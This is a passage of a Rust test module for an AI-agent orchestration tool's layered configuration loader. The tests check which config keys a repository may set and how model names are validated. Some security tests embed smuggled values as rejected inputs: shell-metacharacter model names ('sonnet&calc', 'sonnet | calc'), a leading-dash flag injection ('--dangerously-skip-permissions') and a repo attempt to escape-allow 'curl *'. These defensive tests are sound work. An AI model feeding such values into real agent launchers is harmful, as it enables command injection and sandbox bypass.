            "[workflow]\nreview_worker_budget_tokens = 75000\nreview_worker_max_tool_calls = 30\n",
        )
        .expect("write");
        let repo = tempfile::tempdir().expect("tempdir");
        let empty = env_map(&[]);
        let cfg = CtxConfig::load(repo.path(), &|k| empty.get(k).cloned())
            .expect("the operator's home layer may set these keys");
        assert_eq!(cfg.workflow.review_worker_budget_tokens, Some(75_000));
        assert_eq!(cfg.workflow.review_worker_max_tool_calls, Some(30));

        let overridden = env_map(&[
            ("ZIRV_CTX_WORKFLOW_REVIEW_WORKER_BUDGET_TOKENS", "120000"),
            ("ZIRV_CTX_WORKFLOW_REVIEW_WORKER_MAX_TOOL_CALLS", "10"),
        ]);
        let cfg = CtxConfig::load(repo.path(), &|k| overridden.get(k).cloned())
            .expect("the operator's env may override the home layer");
        assert_eq!(cfg.workflow.review_worker_budget_tokens, Some(120_000));
        assert_eq!(cfg.workflow.review_worker_max_tool_calls, Some(10));
    }

    /// The operator's own `~/.zirv/ctx.toml` may set
    /// `workflow.check_env_passthrough` (only `REPO_FORBIDDEN` blocks the
    /// repo layer, never the home layer), and
    /// `ZIRV_CTX_WORKFLOW_CHECK_ENV_PASSTHROUGH` overrides it from the
    /// environment -- the same operator-in-both-directions shape
    /// `the_operator_may_set_sandbox_extra_allow_and_deny_from_the_
    /// environment` pins for `sandbox.extra_allow`.
    #[test]
    fn the_operator_may_set_workflow_check_env_passthrough_from_home_config_and_env() {
        let home = tempfile::tempdir().expect("tempdir");
        std::fs::create_dir_all(home.path().join(".zirv")).expect("mkdir");
        std::fs::write(
            home.path().join(".zirv/ctx.toml"),
            "[workflow]\ncheck_env_passthrough = [\"CORP_PROXY_TOKEN\"]\n",
        )
        .expect("write");
        let _home = crate::commands::ctx::testenv::HomeGuard::set(home.path());
        let repo = tempfile::tempdir().expect("tempdir");

        let empty = env_map(&[]);
        let cfg = CtxConfig::load(repo.path(), &|k| empty.get(k).cloned()).expect("load");
        assert_eq!(
            cfg.workflow.check_env_passthrough,
            vec!["CORP_PROXY_TOKEN".to_string()],
            "the operator's own home-layer entry must survive"
        );

        let env = env_map(&[(
            "ZIRV_CTX_WORKFLOW_CHECK_ENV_PASSTHROUGH",
            "MY_VAR_A, MY_VAR_B",
        )]);
        let cfg = CtxConfig::load(repo.path(), &|k| env.get(k).cloned()).expect("load");
        assert_eq!(
            cfg.workflow.check_env_passthrough,
            vec!["MY_VAR_A".to_string(), "MY_VAR_B".to_string()],
            "the env value replaces the file-layer value outright"
        );
    }

    /// Issue #147: `safety.escape_allow` is operator-only, the identical
    /// asymmetry `repo_layer_cannot_add_sandbox_extra_allow_entries` above
    /// pins for `sandbox.extra_allow` -- a repo checkout adding to it would
    /// clear a family for its own `--dangerously-disable-sandbox` retries.
    #[test]
    fn repo_layer_cannot_add_safety_escape_allow_entries() {
        let repo = tempfile::tempdir().expect("tempdir");
        std::fs::create_dir_all(repo.path().join(".zirv")).expect("mkdir");
        std::fs::write(
            repo.path().join(".zirv/ctx.toml"),
            "[safety]\nescape_allow = [\"curl *\"]\n",
        )
        .expect("write");
        let home = tempfile::tempdir().expect("tempdir");
        let _home = crate::commands::ctx::testenv::HomeGuard::set(home.path());
        let empty = env_map(&[]);
        let err = CtxConfig::load(repo.path(), &|k| empty.get(k).cloned())
            .expect_err("a repo may not widen the escape-allow list")
            .to_string();
        assert!(err.contains("safety.escape_allow"), "got {err}");
        assert!(
            err.contains("ZIRV_CTX_SAFETY_ESCAPE_ALLOW"),
            "names the operator escape hatch: {err}"
        );
    }

    /// The one list a repo checkout *may* contribute to: adding a deny entry
    /// only ever narrows. The union must include both layers' entries, end
    /// to end through `CtxConfig::load` -- a plain deep merge would let the
    /// repo's array silently replace the operator's instead.
    #[test]
    fn sandbox_extra_deny_unions_the_operators_and_the_repos_own_entries() {
        let home = tempfile::tempdir().expect("tempdir");
        std::fs::create_dir_all(home.path().join(".zirv")).expect("mkdir");
        std::fs::write(
            home.path().join(".zirv/ctx.toml"),
            "[sandbox]\nextra_deny = [\"Bash(npm publish *)\"]\n",
        )
        .expect("write");
        let _home = crate::commands::ctx::testenv::HomeGuard::set(home.path());

        let repo = tempfile::tempdir().expect("tempdir");
        std::fs::create_dir_all(repo.path().join(".zirv")).expect("mkdir");
        std::fs::write(
            repo.path().join(".zirv/ctx.toml"),
            "[sandbox]\nextra_deny = [\"Bash(docker push *)\"]\n",
        )
        .expect("write");

        let empty = env_map(&[]);
        let cfg = CtxConfig::load(repo.path(), &|k| empty.get(k).cloned()).expect("load");
        assert!(
            cfg.sandbox
                .extra_deny
                .contains(&"Bash(npm publish *)".to_string()),
            "the operator's own entry must survive: {:?}",
            cfg.sandbox.extra_deny
        );
        assert!(
            cfg.sandbox
                .extra_deny
                .contains(&"Bash(docker push *)".to_string()),
            "the repo's own addition must land too: {:?}",
            cfg.sandbox.extra_deny
        );
    }

    /// The environment is the operator in both directions, exactly like
    /// `[policy]`'s own env layer: it replaces the unioned file value
    /// outright, for both extra lists.
    #[test]
    fn the_operator_may_set_sandbox_extra_allow_and_deny_from_the_environment() {
        let home = tempfile::tempdir().expect("tempdir");
        std::fs::create_dir_all(home.path().join(".zirv")).expect("mkdir");
        std::fs::write(
            home.path().join(".zirv/ctx.toml"),
            "[sandbox]\nextra_deny = [\"Bash(npm publish *)\"]\n",
        )
        .expect("write");
        let _home = crate::commands::ctx::testenv::HomeGuard::set(home.path());
        let repo = tempfile::tempdir().expect("tempdir");
        let env = env_map(&[
            (
                "ZIRV_CTX_SANDBOX_EXTRA_ALLOW",
                "Bash(just test *), Bash(just build *)",
            ),
            ("ZIRV_CTX_SANDBOX_EXTRA_DENY", "Bash(terraform apply *)"),
        ]);
        let cfg = CtxConfig::load(repo.path(), &|k| env.get(k).cloned()).expect("load");
        assert_eq!(
            cfg.sandbox.extra_allow,
            vec![
                "Bash(just test *)".to_string(),
                "Bash(just build *)".to_string()
            ]
        );
        assert_eq!(
            cfg.sandbox.extra_deny,
            vec!["Bash(terraform apply *)".to_string()],
            "the env value replaces the file-layer union outright"
        );
    }

    /// Same operator-final-word shape as `sandbox.extra_allow`'s own env
    /// override, pinned separately for `dash.workdir_roots` since it has no
    /// union counterpart to fold with (the key is `REPO_FORBIDDEN` outright,
    /// so only the operator's own home layer or this env var ever populate
    /// it -- there is nothing for a repo layer to contribute).
    #[test]
    fn the_operator_may_widen_dash_workdir_roots_from_the_environment() {
        let home = tempfile::tempdir().expect("tempdir");
        std::fs::create_dir_all(home.path().join(".zirv")).expect("mkdir");
        std::fs::write(
            home.path().join(".zirv/ctx.toml"),
            "[dash]\nworkdir_roots = [\"/from/home/layer\"]\n",
        )
        .expect("write");
        let _home = crate::commands::ctx::testenv::HomeGuard::set(home.path());
        let repo = tempfile::tempdir().expect("tempdir");
        let env = env_map(&[(
            "ZIRV_CTX_DASH_WORKDIR_ROOTS",
            "/from/env/one, /from/env/two",
        )]);
        let cfg = CtxConfig::load(repo.path(), &|k| env.get(k).cloned()).expect("load");
        assert_eq!(
            cfg.dash.workdir_roots,
            vec!["/from/env/one".to_string(), "/from/env/two".to_string()],
            "the env value replaces the home-layer value outright"
        );
    }

    /// Deny continues to beat allow even when both sides of the conflict
    /// come from operator-added entries rather than the shipped lists --
    /// the underlying CLI mechanism does not care which list an entry came
    /// from, but this pins that the config layer does not accidentally
    /// separate them in a way that would matter.
    #[test]
    fn an_operator_added_deny_entry_beats_an_operator_added_allow_entry() {
        use super::super::adapters::AgentAdapter;
        let cfg = CtxConfig {
            sandbox: SandboxConfig {
                enabled: true,
                extra_allow: vec!["Bash(deploy *)".to_string()],
                extra_deny: vec!["Bash(deploy *)".to_string()],
                scrub_subprocess_env: false,
            },
            ..CtxConfig::default()
        };
        let claude = super::super::adapters::claude::ClaudeAdapter::new(None);
        let args = claude.default_sandbox_args(
            &cfg.sandbox,
            &Default::default(),
            super::super::adapters::LaunchMode::Headless,
        );
        let allow_arg = args
            .iter()
            .find(|a| a.starts_with("--allowedTools="))
            .expect("allow token");
        let deny_arg = args
            .iter()
            .find(|a| a.starts_with("--disallowedTools="))
            .expect("deny token");
        assert!(allow_arg.contains("Bash(deploy *)"));
        assert!(
            deny_arg.contains("Bash(deploy *)"),
            "both lists carry the entry; claude's own engine resolves the conflict as deny-wins \
             (verified live for the shipped pair), not this config layer"
        );
    }

    #[test]
    fn env_can_disable_the_dashboard() {
        let repo = tempfile::tempdir().expect("tempdir");
        let env = env_map(&[("ZIRV_CTX_DASH", "false")]);
        let cfg = CtxConfig::load(repo.path(), &|k| env.get(k).cloned()).expect("load");
        assert!(!cfg.dash.enabled);
    }

    #[test]
    fn the_operator_may_still_set_dash_keys() {
        let home_only = tempfile::tempdir().expect("tempdir");
        let _home = crate::commands::ctx::testenv::HomeGuard::set(home_only.path());
        let env = env_map(&[
            ("ZIRV_CTX_DASH", "false"),
            ("ZIRV_CTX_DASH_SIDEBAR_COLS", "30"),
            ("ZIRV_CTX_DASH_ROSTER_MAX_AGE_SECS", "60"),
            ("ZIRV_CTX_DASH_MAX_PANES", "3"),
            ("ZIRV_CTX_DASH_MOUSE", "false"),
        ]);
        let cfg = CtxConfig::load(home_only.path(), &|k| env.get(k).cloned()).expect("load");
        assert!(!cfg.dash.enabled, "the environment is the operator");
        assert_eq!(cfg.dash.sidebar_cols, 30);
        assert_eq!(cfg.dash.roster_max_age_secs, 60);
        assert_eq!(cfg.dash.max_panes, 3);
        assert!(
            !cfg.dash.mouse,
            "an operator who wants native text selection back turns capture off"
        );
    }

    #[test]
    fn chat_model_defaults_to_none() {
        assert_eq!(ChatConfig::default().model, None);
    }

    /// Unlike `handoff.model`/`optimize.model`, `chat.model` shapes an
    /// interactive session the operator deliberately launched and the choice
    /// is displayed on screen -- see `ChatConfig`'s own doc comment and the
    /// spec's "Orchestrator model" section
    /// (docs/superpowers/specs/2026-08-13-zirv-dashboard-design.md). A repo
    /// checkout is therefore allowed to set it, unlike every other model key
    /// in `REPO_FORBIDDEN`.
    #[test]
    fn a_repository_config_may_set_the_chat_model() {
        let repo = tempfile::tempdir().expect("tempdir");
        std::fs::create_dir_all(repo.path().join(".zirv")).expect("mkdir");
        std::fs::write(
            repo.path().join(".zirv/ctx.toml"),
            "[chat]\nmodel = \"opus\"\n",
        )
        .expect("write");

        let empty = env_map(&[]);
        let cfg = CtxConfig::load(repo.path(), &|k| empty.get(k).cloned()).expect("load");
        assert_eq!(cfg.chat.model.as_deref(), Some("opus"));
    }

    #[test]
    fn env_overrides_the_chat_model() {
        let repo = tempfile::tempdir().expect("tempdir");
        let env = env_map(&[("ZIRV_CTX_CHAT_MODEL", "sonnet")]);
        let cfg = CtxConfig::load(repo.path(), &|k| env.get(k).cloned()).expect("load");
        assert_eq!(cfg.chat.model.as_deref(), Some("sonnet"));
    }

    /// SECURITY (FIX 1): `chat.model` is repo-settable and reaches an argv that
    /// `resolve_program` may route through `cmd.exe /c` on Windows, so a repo
    /// value bearing a shell/cmd metacharacter must fail the load rather than
    /// carry a command-injection payload into the launch.
    #[test]
    fn a_repo_chat_model_with_a_shell_metacharacter_is_rejected() {
        let home = tempfile::tempdir().expect("tempdir");
        let _home = crate::commands::ctx::testenv::HomeGuard::set(home.path());
        let repo = tempfile::tempdir().expect("tempdir");
        std::fs::create_dir_all(repo.path().join(".zirv")).expect("mkdir");
        std::fs::write(
            repo.path().join(".zirv/ctx.toml"),
            "[chat]\nmodel = \"sonnet&calc\"\n",
        )
        .expect("write");
        let empty = env_map(&[]);
        let err = CtxConfig::load(repo.path(), &|k| empty.get(k).cloned())
            .expect_err("a metacharacter model must fail the load");
        assert!(
            err.to_string().contains("chat.model"),
            "the refusal names the key: {err}"
        );
    }

    /// FIX 1: real model ids -- a Bedrock id with `:` `/` `.`, a Vertex id with
    /// `@`, a hyphenated alias, a bare name -- use only the allowed charset and
    /// load cleanly, so the exemption's disclosed operator-in-repo purpose
    /// survives the guard.
    #[test]
    fn real_model_ids_are_accepted() {
        for model in [
            "us.anthropic.claude-sonnet-4-v1:0",
            "claude-fable-5",
            "fable",
            "claude-sonnet-4@20250101",
        ] {
            let home = tempfile::tempdir().expect("tempdir");
            let _home = crate::commands::ctx::testenv::HomeGuard::set(home.path());
            let repo = tempfile::tempdir().expect("tempdir");
            std::fs::create_dir_all(repo.path().join(".zirv")).expect("mkdir");
            std::fs::write(
                repo.path().join(".zirv/ctx.toml"),
                format!("[chat]\nmodel = \"{model}\"\n"),
            )
            .expect("write");
            let empty = env_map(&[]);
            let cfg = CtxConfig::load(repo.path(), &|k| empty.get(k).cloned())
                .unwrap_or_else(|e| panic!("'{model}' should load: {e}"));
            assert_eq!(cfg.chat.model.as_deref(), Some(model));
        }
    }

    /// SECURITY: a leading-dash model value would reach the launch argv as its
    /// own flag (`--model --dangerously-skip-permissions`), so it is rejected at
    /// load, while an ordinary hyphenated id (`claude-opus-5`) that only uses a
    /// hyphen mid-token still loads cleanly.
    #[test]
    fn a_leading_dash_chat_model_is_rejected() {
        let home = tempfile::tempdir().expect("tempdir");
        let _home = crate::commands::ctx::testenv::HomeGuard::set(home.path());
        let repo = tempfile::tempdir().expect("tempdir");
        let env = env_map(&[("ZIRV_CTX_CHAT_MODEL", "--dangerously-skip-permissions")]);
        let err = CtxConfig::load(repo.path(), &|k| env.get(k).cloned())
            .expect_err("a leading-dash model must fail the load");
        assert!(err.to_string().contains("chat.model"), "got {err}");

        for good in ["fable", "claude-opus-5"] {
            let env = env_map(&[("ZIRV_CTX_CHAT_MODEL", good)]);
            let cfg = CtxConfig::load(repo.path(), &|k| env.get(k).cloned())
                .unwrap_or_else(|e| panic!("'{good}' should load: {e}"));
            assert_eq!(cfg.chat.model.as_deref(), Some(good));
        }
    }

    /// FIX 1: the `ZIRV_CTX_CHAT_MODEL` env path merges before the same
    /// validation, so an operator-set metacharacter is rejected identically --
    /// the check is on the merged value, not on which layer set it.
    #[test]
    fn the_env_chat_model_path_is_validated_identically() {
        let home = tempfile::tempdir().expect("tempdir");
        let _home = crate::commands::ctx::testenv::HomeGuard::set(home.path());
        let repo = tempfile::tempdir().expect("tempdir");
        let env = env_map(&[("ZIRV_CTX_CHAT_MODEL", "sonnet | calc")]);
        let err = CtxConfig::load(repo.path(), &|k| env.get(k).cloned())
            .expect_err("an env metacharacter model must fail too");
        assert!(err.to_string().contains("chat.model"), "got {err}");
    }

    /// FIX 1: an over-long model string is rejected before it can reach any
    /// argv, bounding the value regardless of its charset.
    #[test]
    fn an_overlong_chat_model_is_rejected() {
        let home = tempfile::tempdir().expect("tempdir");
        let _home = crate::commands::ctx::testenv::HomeGuard::set(home.path());
        let repo = tempfile::tempdir().expect("tempdir");
        let long = "a".repeat(129);
        let env = env_map(&[("ZIRV_CTX_CHAT_MODEL", long.as_str())]);
        let err = CtxConfig::load(repo.path(), &|k| env.get(k).cloned())
            .expect_err("a 129-char model must fail");
        assert!(err.to_string().contains("chat.model"), "got {err}");
    }

    #[test]
    fn the_agent_gate_is_loaded_alongside_the_ctx_config() {
        let repo = tempfile::tempdir().expect("tempdir");
        std::fs::create_dir_all(repo.path().join(".zirv")).expect("mkdir");
        std::fs::write(
            repo.path().join(".zirv/.settings.toml"),
            "[agents.codex]\nenabled = false\n",
        )
        .expect("write");
        let home = tempfile::tempdir().expect("tempdir");
        let _home = crate::commands::ctx::testenv::HomeGuard::set(home.path());

        let empty = env_map(&[]);
        let cfg = CtxConfig::load(repo.path(), &|k| empty.get(k).cloned()).expect("load");
        assert!(!cfg.agents.is_enabled("codex"));
        assert!(cfg.agents.is_enabled("claude"));
    }

    #[test]
    fn repo_deploy_minimum_can_only_raise_operator_tier() {
        use crate::commands::workflow::deploy::DeployTier;

        let home = tempfile::tempdir().expect("tempdir");
        std::fs::create_dir_all(home.path().join(".zirv")).expect("mkdir");
        std::fs::write(
            home.path().join(".zirv/ctx.toml"),
            "[workflow.deploy]\ntier = \"staging\"\nminimum_tier = \"development\"\n",
        )
        .expect("home");
        let _home = crate::commands::ctx::testenv::HomeGuard::set(home.path());

        let repo = tempfile::tempdir().expect("tempdir");
        std::fs::create_dir_all(repo.path().join(".zirv")).expect("mkdir");
        std::fs::write(
            repo.path().join(".zirv/ctx.toml"),
            "[workflow.deploy]\nminimum_tier = \"production\"\n",
        )
        .expect("repo");

        let empty = env_map(&[]);
        let cfg = CtxConfig::load(repo.path(), &|key| empty.get(key).cloned()).expect("load");
        assert_eq!(cfg.workflow.deploy.tier, DeployTier::Production);
        assert_eq!(
            cfg.workflow.deploy.minimum_tier,
            Some(DeployTier::Production)
        );
    }

    #[test]
    fn repo_deploy_minimum_cannot_lower_operator_tier() {
        use crate::commands::workflow::deploy::DeployTier;

        let home = tempfile::tempdir().expect("tempdir");
        std::fs::create_dir_all(home.path().join(".zirv")).expect("mkdir");
        std::fs::write(
            home.path().join(".zirv/ctx.toml"),
            "[workflow.deploy]\ntier = \"production\"\n",
        )
        .expect("home");
        let _home = crate::commands::ctx::testenv::HomeGuard::set(home.path());

        let repo = tempfile::tempdir().expect("tempdir");
        std::fs::create_dir_all(repo.path().join(".zirv")).expect("mkdir");
        std::fs::write(
            repo.path().join(".zirv/ctx.toml"),
            "[workflow.deploy]\nminimum_tier = \"development\"\n",
        )
        .expect("repo");

        let empty = env_map(&[]);
        let cfg = CtxConfig::load(repo.path(), &|key| empty.get(key).cloned()).expect("load");
        assert_eq!(cfg.workflow.deploy.tier, DeployTier::Production);
    }

    #[test]
    fn repo_cannot_choose_deploy_tier_but_operator_env_can_override_the_fold() {
        use crate::commands::workflow::deploy::DeployTier;

        let home = tempfile::tempdir().expect("tempdir");
        let _home = crate::commands::ctx::testenv::HomeGuard::set(home.path());
        let repo = tempfile::tempdir().expect("tempdir");
        std::fs::create_dir_all(repo.path().join(".zirv")).expect("mkdir");
        std::fs::write(
            repo.path().join(".zirv/ctx.toml"),
            "[workflow.deploy]\ntier = \"development\"\n",
        )
        .expect("repo");
        let empty = env_map(&[]);
        let error = CtxConfig::load(repo.path(), &|key| empty.get(key).cloned())
            .expect_err("repo tier must be forbidden")
            .to_string();
        assert!(error.contains("workflow.deploy.tier"), "{error}");

        std::fs::write(
            repo.path().join(".zirv/ctx.toml"),
            "[workflow.deploy]\nminimum_tier = \"production\"\n",
        )
        .expect("repo");
        let env = env_map(&[("ZIRV_CTX_WORKFLOW_DEPLOY_TIER", "development")]);
        let cfg = CtxConfig::load(repo.path(), &|key| env.get(key).cloned()).expect("env");
        assert_eq!(cfg.workflow.deploy.tier, DeployTier::Development);
        assert_eq!(
            cfg.workflow.deploy.minimum_tier,
            Some(DeployTier::Production),
            "the declared repo minimum remains inspectable even when operator env overrides it"
        );
    }

    #[test]
    fn workflow_adoption_defaults_to_nudge() {
        let home = tempfile::tempdir().expect("tempdir");
        let _home = crate::commands::ctx::testenv::HomeGuard::set(home.path());
        let repo = tempfile::tempdir().expect("tempdir");
        let empty = env_map(&[]);
        let cfg = CtxConfig::load(repo.path(), &|key| empty.get(key).cloned()).expect("load");
        assert_eq!(
            cfg.workflow.adoption,
            crate::commands::workflow::adoption::AdoptionPolicy::Nudge
        );
    }

    #[test]
    fn workflow_adoption_env_override_parses_every_level() {
        use crate::commands::workflow::adoption::AdoptionPolicy;

        let home = tempfile::tempdir().expect("tempdir");
        let _home = crate::commands::ctx::testenv::HomeGuard::set(home.path());
        let repo = tempfile::tempdir().expect("tempdir");

        for (raw, expected) in [
            ("off", AdoptionPolicy::Off),
            ("advise", AdoptionPolicy::Advise),
            ("nudge", AdoptionPolicy::Nudge),
            ("enforce", AdoptionPolicy::Enforce),
        ] {
            let env = env_map(&[("ZIRV_CTX_WORKFLOW_ADOPTION", raw)]);
            let cfg =
                CtxConfig::load(repo.path(), &|key| env.get(key).cloned()).expect("env override");
            assert_eq!(cfg.workflow.adoption, expected, "raw value {raw}");
        }
    }

    /// SECURITY: `workflow.adoption` is operator-only -- a repo checkout must
    /// not be able to loosen its own adoption pressure to `off`, nor tighten
    /// it to `enforce` to hold an operator's own agent dispatches hostage.
    #[test]
    fn a_repo_ctx_toml_cannot_set_workflow_adoption() {
        let home = tempfile::tempdir().expect("home");
        let _home = crate::commands::ctx::testenv::HomeGuard::set(home.path());
        let repo = tempfile::tempdir().expect("repo");
        std::fs::create_dir_all(repo.path().join(".zirv")).expect("mkdir");
        std::fs::write(
            repo.path().join(".zirv/ctx.toml"),
            "[workflow]\nadoption = \"off\"\n",
        )
        .expect("write");
        let empty: HashMap<String, String> = HashMap::new();
        let err = CtxConfig::load(repo.path(), &|k| empty.get(k).cloned())
            .expect_err("a repo may not set workflow.adoption");
        assert!(
            is_repo_forbidden(err.as_ref()),
            "must be a security refusal: {err}"
        );
    }

    #[test]
    fn repo_cannot_configure_maintain_commands_or_report_destination() {
        let home = tempfile::tempdir().expect("tempdir");
        let _home = crate::commands::ctx::testenv::HomeGuard::set(home.path());
        let repo = tempfile::tempdir().expect("tempdir");
        std::fs::create_dir_all(repo.path().join(".zirv")).expect("mkdir");

        for body in [
            "[workflow.maintain]\ntimeout_secs = 1\n[workflow.maintain.detectors.bad]\ncommand = \"echo bad\"\n",
            "[report]\nrepository = \"attacker/repo\"\n",
        ] {
            std::fs::write(repo.path().join(".zirv/ctx.toml"), body).expect("write");
            let empty = env_map(&[]);
            let error = CtxConfig::load(repo.path(), &|key| empty.get(key).cloned())
                .expect_err("repo authority must be rejected")
                .to_string();
            assert!(
                error.contains("workflow.maintain") || error.contains("report.repository"),
                "{error}"
            );
        }
    }

    #[test]
    fn operator_can_configure_maintain_detector_and_report_destination() {
        let home = tempfile::tempdir().expect("tempdir");
        std::fs::create_dir_all(home.path().join(".zirv")).expect("mkdir");
        std::fs::write(
            home.path().join(".zirv/ctx.toml"),
            "[workflow.maintain]\ntimeout_secs = 12\n[workflow.maintain.detectors.audit]\ncommand = \"printf issue\"\nmode = \"line-count\"\nthreshold = 1\n[report]\nrepository = \"owner/incidents\"\n",
        )
        .expect("home");
        let _home = crate::commands::ctx::testenv::HomeGuard::set(home.path());
        let repo = tempfile::tempdir().expect("repo");
        let empty = env_map(&[]);
        let cfg = CtxConfig::load(repo.path(), &|key| empty.get(key).cloned()).expect("load");
        assert_eq!(cfg.workflow.maintain.timeout_secs, 12);
        let detector = cfg
            .workflow
            .maintain
            .detectors
            .get("audit")
            .expect("detector");
        assert_eq!(detector.command, "printf issue");
        assert_eq!(detector.mode, MaintainDetectorMode::LineCount);
        assert_eq!(detector.threshold, 1);
        assert_eq!(cfg.report.repository.as_deref(), Some("owner/incidents"));
    }

    #[test]
    fn report_destination_env_is_operator_final_word() {
        let home = tempfile::tempdir().expect("tempdir");
        let _home = crate::commands::ctx::testenv::HomeGuard::set(home.path());
        let repo = tempfile::tempdir().expect("repo");
        let env = env_map(&[("ZIRV_CTX_REPORT_REPOSITORY", "operator/incidents")]);
        let cfg = CtxConfig::load(repo.path(), &|key| env.get(key).cloned()).expect("load");
        assert_eq!(cfg.report.repository.as_deref(), Some("operator/incidents"));
    }

    /// Every configurable key in `CtxConfig`'s tree, as (table path, key)
    /// pairs. `table path` is dot-joined to match how a nested table's
    /// header appears in the sample-config file (`"pace.use_credits"`); the
    /// empty string is the top-level (pre-`[table]`) scope.
    ///
    /// Hand-maintained against config.rs's struct definitions rather than
    /// derived from `ENV_MAP`: `ENV_MAP` only covers keys that have an
    /// environment override and is missing several real config keys (every
    /// `score` weight/threshold, `handoff.tail_items`,
    /// `optimize.max_surface_bytes` and its `recommend_*` siblings), so it
    /// is not a complete key list on its own.
    const ALL_CONFIG_KEYS: &[(&str, &str)] = &[
        ("", "agent"),
        ("", "agent_bin"),
        ("chat", "model"),
        ("review", "claude"),
        ("review", "codex"),
        ("worker", "claude"),
        ("worker", "codex"),
        ("handover.claude", "cheap"),
        ("handover.claude", "standard"),
        ("handover.claude", "deep"),
        ("handover.codex", "cheap"),
        ("handover.codex", "standard"),
        ("handover.codex", "deep"),
        ("score", "window"),
        ("score", "min_turns"),
        ("score", "token_floor"),
        ("score", "token_ceiling"),
        ("score", "token_floor_ratio"),
        ("score", "token_ceiling_ratio"),
        ("score", "model_context_tokens"),
        ("score", "weight_tool_failure"),
        ("score", "weight_repetition"),
        ("score", "weight_marker"),
        ("score", "same_error_weight"),
        ("score", "repetition_threshold"),
        ("score", "same_error_threshold"),
        ("score", "advise_at"),
        ("score", "compact_at"),
        ("score", "restart_at"),
        ("score", "marker"),
        ("wrap", "debounce_ms"),
        ("wrap", "inject_timeout_ms"),
        ("supervise", "max_restarts"),
        ("supervise", "poll_ms"),
        ("supervise", "interval_secs"),
        ("supervise", "max_cycle_secs"),
        ("supervise", "max_failures"),
        ("supervise", "backoff_base_secs"),
        ("supervise", "on_failure"),
        ("supervise", "max_nudges"),
        ("supervise", "max_heavy_operations"),
        ("supervise", "max_heavy_workers"),
        ("supervise", "max_writers"),
        ("handoff", "model"),
        ("handoff", "tail_items"),
        ("handoff", "timeout_secs"),
        ("pace", "enabled"),
        ("pace", "max_percent"),
        ("pace", "collector_max_age_secs"),
        ("pace", "estimator"),
        ("pace", "five_hour_budget_tokens"),
        ("pace", "seven_day_budget_tokens"),
        ("pace", "count_cache_reads"),
        ("pace", "jitter_secs"),
        ("pace", "fallback_delay_secs"),
        ("pace", "wait_slack_secs"),
        ("pace", "max_wait_secs"),
        ("pace", "soft_percent"),
        ("pace", "poll_enabled"),
        ("pace", "poll_min_interval_secs"),
        ("pace", "blind_delay_secs"),
        ("pace", "spawn_soft_pct"),
        ("pace", "spawn_hard_pct"),
        ("pace", "run_budget_tokens"),
        ("pace.use_credits", "claude"),
        ("pace.use_credits", "codex"),
        ("price", "stale_after_days"),
        ("price", "table_path"),
        ("optimize", "enabled"),
        ("optimize", "sessions_sampled"),
        ("optimize", "max_surface_bytes"),
        ("optimize", "model"),
        ("optimize", "recommend_tool_failure_rate"),
        ("optimize", "recommend_corrections"),
        ("optimize", "recommend_cooldown_secs"),
        ("prompt", "enabled"),
        ("prompt", "repo_layer"),
        ("prompt", "max_repo_bytes"),
        ("prompt", "harnesses"),
        ("prompt", "codex_orchestrator"),
        ("context", "max_common_bytes"),
        ("context", "max_harness_bytes"),
        ("context", "max_harness_roster_bytes"),
        ("context", "dedupe_native"),
        ("context", "lint_max_pairs"),
        ("mail", "enabled"),
        ("mail", "max_message_bytes"),
        ("mail", "max_delivered_bytes"),
        ("mail", "keep"),
        ("memory", "enabled"),
        ("memory", "harvest"),
        ("memory", "max_entries"),
        ("memory", "max_entry_bytes"),
        ("memory", "max_injected_bytes"),
        ("memory", "shared_enabled"),
        ("memory", "core_max_bytes"),
        ("memory", "retrieval_max_bytes"),
        ("memory", "retrieval_max_entries"),
        ("memory", "harvest_max_entries"),
        ("memory", "harvest_max_bytes"),
        ("setup", "backup_retention_runs"),
        ("setup", "memory_harvest_offered"),
        ("setup", "statusline_wrap_offered"),
        ("chrome", "banner"),
        ("chrome", "bar"),
        ("chrome", "events"),
        ("dash", "enabled"),
        ("dash", "sidebar_cols"),
        ("dash", "roster_max_age_secs"),
        ("dash", "max_panes"),
        ("dash", "mouse"),
        ("dash", "idle_quiet_ms"),
        ("dash", "workdir_roots"),
        ("workflow", "repo_checks_enabled"),
        ("workflow", "repo_skills_enabled"),
        ("workflow", "repo_agents_enabled"),
        ("workflow.deploy", "tier"),
        ("workflow.deploy", "minimum_tier"),
        ("workflow", "adoption"),
        ("workflow.maintain", "timeout_secs"),
        ("report", "repository"),
        ("workflow", "telemetry_enabled"),
        ("workflow", "telemetry_max_events"),
        ("workflow", "telemetry_retention_days"),
        ("workflow", "check_env_passthrough"),
        ("workflow", "review_worker_budget_tokens"),
        ("workflow", "review_worker_max_tool_calls"),
        ("workflow", "auto_spawn_on_gate"),
        ("workflow", "allow_empty_verify"),
        ("policy", "repo_fs_write"),
        ("policy", "outside_repo_fs_write"),
        ("policy", "shell_exec"),
        ("policy", "network"),
        ("policy", "approval"),
        ("policy", "git_push_destructive"),
        ("policy", "tool_access"),
        ("safety", "deny"),
        ("safety", "ask"),
        ("safety", "allow"),
        ("safety", "escape_allow"),
        ("safety", "default"),
        ("safety", "interactive_default"),
        ("safety", "sql"),
        ("safety", "denial_breaker_threshold"),
        ("safety", "identical_command_warn_after"),
        ("safety", "identical_command_refuse_after"),
    ];

    /// The lines belonging to table `path` in a sample-config file like
    /// `.zirv/ctx.toml`: from the line naming `[path]` (commented or not,
    /// e.g. `# [pace.use_credits]`) up to (but excluding) the next such
    /// header line, or from the top of the file up to the first header when
    /// `path` is empty. Table-scoped so a key name that repeats across
    /// tables (`enabled`, `model`) can't produce a false positive from an
    /// unrelated section.
    fn table_section(text: &str, path: &str) -> String {
        let lines: Vec<&str> = text.lines().collect();
        let is_header = |line: &str| {
            line.trim_start()
                .trim_start_matches('#')
                .trim_start()
                .starts_with('[')
        };
        let wanted = format!("[{path}]");
        let start = if path.is_empty() {
            0
        } else {
            let idx = lines
                .iter()
                .position(|l| {
                    l.trim_start()
                        .trim_start_matches('#')
                        .trim_start()
                        .starts_with(&wanted)
                })
                .unwrap_or_else(|| panic!("no [{path}] header found in the file"));
            idx + 1
        };
        let end = lines[start..]
            .iter()
            .position(|l| is_header(l))
            .map_or(lines.len(), |i| start + i);
        lines[start..end].join("\n")
    }

    /// Whether `key` appears as its own assignment (`key = ...`) somewhere in
    /// `section`, active or commented out. Only the key name is checked, not
    /// the value, so this must not fail when someone edits a value.
    fn section_has_key(section: &str, key: &str) -> bool {
        section.lines().any(|line| {
            line.trim_start()
                .trim_start_matches('#')
                .trim_start()
                .starts_with(&format!("{key} ="))
        })
    }

    /// The checked-in `.zirv/ctx.toml` is a sample-config reference: every
    /// key is shown, commented out, at its built-in default, so it doubles
    /// as documentation of what `CtxConfig` can be tuned to do without ever
